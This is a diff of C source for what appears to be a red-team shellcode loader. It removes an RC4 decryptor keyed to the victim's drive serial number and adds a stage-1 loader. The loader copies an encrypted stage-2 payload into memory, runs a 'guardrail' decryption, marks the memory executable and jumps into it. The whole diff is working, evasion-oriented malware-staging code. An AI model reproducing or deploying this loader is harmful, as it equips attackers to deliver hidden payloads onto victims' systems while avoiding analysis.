@@ -15,7 +15,7 @@
  * endorse or promote products derived from this software without specific prior written
  * permission.
  *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â� AND ANY EXPRESS
  * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
  * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
  * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
@@ -27,129 +27,65 @@
  */
  
 #include <windows.h>
+#include "tcg.h"
+ 
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+ 
+/* defined in guardrail.c */
+char * guardrail_decrypt(char * buffer, int len, int * outlen);
+ 
+/* entry point to our free and run PIC, part of our decrypted stage 2 */
+typedef void (* FREEANDRUN)(void * loaderStart);
  
 /*
- * We're going to rely on an undocumented Win32 function to do the RC4 decrypt
- * https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/
- *
- * OPSEC Note: outside of a VERY size-constrained situation, I would prefer to
- * just have RC4 functions in my code without the overhead and observation
- * (e.g., hooking) opportunity of a (rarely used?) Win32 undocumented function.
+ * This is the Crystal Palace convention for getting ahold of data linked with this loader.
  */
+char __STAGE2__[0] __attribute__((section("stage2")));
+ 
+/* our encrypted DLL has its length prepended to it */
 typedef struct {
-    DWORD  length;
-    DWORD  maxlen;
-    char * buffer;
-} USTRING;
- 
-WINBASEAPI LONG WINAPI ADVAPI32$SystemFunction033(USTRING * data, USTRING * key);
- 
-/*
- * Adler32 checksum to check if our decrypted data is what we likely intended.
- * https://www.ietf.org/rfc/rfc1950.txt
- */
-DWORD checksum(unsigned char * buffer, DWORD length) {
-    DWORD a = 1, b = 0;
- 
-    for (int x = 0; x < length; x++) {
-        a = (a + buffer[x]) % 65521;
-        b = (a + b) % 65521;
-    }
- 
-    return (b << 16) + a;
-}
- 
-/*
- * Derive an environment key using GetVolumeInformationA
- */
-WINBASEAPI WINBOOL WINAPI KERNEL32$GetVolumeInformationA (LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer,
-            DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength,
-            LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
- 
-typedef struct {
-    DWORD a;
-    DWORD b;
-} ENVKEY;
- 
-ENVKEY DeriveKeySerialNo() {
-    ENVKEY result;
- 
-    /* get the volume serial number and copy it to our key buffer */
-    DWORD volumeSerialNumber = 0;
-    KERNEL32$GetVolumeInformationA("c:\\", NULL, 0, &volumeSerialNumber, NULL, NULL, NULL, 0);
- 
-    /* we're going through this gymnastic because rc4 wants at least 40b (5 bytes) to encrypt. */
-    result.a = volumeSerialNumber;
-    result.b = volumeSerialNumber;
- 
-    return result;
-}
- 
-/*
- * _VERIFY is the result of "prepsum" from loader.spec.
- */
-typedef struct {
-    DWORD checksum;
+    int   length;
     char  value[];
-} _VERIFY;
+} _RESOURCE;
  
 /*
- * We are going to accept a buffer from the parent loader, to give the parent control over
- * how to allocate (and free) the memory for our decryption.
- *
- * char * dst    - the destination where our decrypted payload will live
- *                 (note: we expect this buffer is pre-populated with our ciphertext, we
- *                  decrypt in place)
- * int    len    - the length of our ciphertext. It better be <= the size of dst.
- * int  * outlen - a ptr to a var to populate with the size of the decrypted content.
- *                 This parameter is optional and a NULL value is OK.
- *
- * Returns a pointer to the decrypted VALUE if successful
- * Returns NULL if decryption or verification failed
+ * Our reflective loader itself, have fun, go nuts!
  */
-char * go(char * dst, int len, int * outlen) {
-    ENVKEY      key;
+void go() {
+    _RESOURCE  * stage2;
+    char       * buffer;
+    char       * data;
+    DWORD        oldProt;
  
-    USTRING     u_data;
-    USTRING     u_key;
+    /* find our (encrypted) capability appended to this PIC */
+    stage2 = (_RESOURCE *)&__STAGE2__;
  
-    _VERIFY   * hdr;
-    int         ddlen;
-    int         ddsum;
+    /* allocate memory for our encrypted stage 2 */
+    buffer = KERNEL32$VirtualAlloc( NULL, stage2->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
  
-    /* This is where we bring our environment-derived key into the mix.
-     * Here, we are using the c:\ drive's serial number as a simple key. */
-    key = DeriveKeySerialNo();
+    /* copy our (encrypted) stage 2 over to our RW working buffer */
+    __movsb((unsigned char *)buffer, (unsigned char *)stage2->value, stage2->length);
  
-    /* setup our USTRING data structures for RC4 decrypt */
-    u_data.length = len;
-    u_data.buffer = dst;
+    /* run our guardrail function to handle *everything* about the guardrail process. Note that the return
+     * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
+    data = guardrail_decrypt(buffer, stage2->length, NULL);
  
-    u_key.length  = sizeof(ENVKEY);
-    u_key.buffer  = (char *)&key;
- 
-    /* call the System033 function to do an RC4 decrypt */
-    ADVAPI32$SystemFunction033(&u_data, &u_key);
- 
-    /* now, we need to *verify* our result. */
-    hdr  = (_VERIFY *)dst;
- 
-    /* decrypted data length */
-    ddlen = len - sizeof(DWORD);
- 
-    /* store our output length too, if an outptr was provided */
-    if (outlen != NULL)
-        *outlen = ddlen;
- 
-    /* checksum for our decrypted data */
-    ddsum = checksum((unsigned char *)hdr->value, ddlen);
- 
-    /* this succeeded if the packed-in and calculcated checksums match */
-    if (hdr->checksum == ddsum) {
-        return hdr->value;
+    /*
+     * Guadrail decryption FAILED, do something else, or just exit.
+     */
+    if (data == NULL) {
+        KERNEL32$VirtualFree( buffer, 0, MEM_RELEASE );
+        return;
     }
-    else {
-        return NULL;
-    }
+ 
+    /*
+     * Guardail decryption SUCCESS, run stage 2!
+     */
+    if (!KERNEL32$VirtualProtect(buffer, stage2->length, PAGE_EXECUTE_READ, &oldProt))
+        return;
+ 
+    /* Call our free and run PIC with go() (our position 0) as the argument. It'll call the stage 2 PIC */
+    ((FREEANDRUN)data)(go);
 }
-
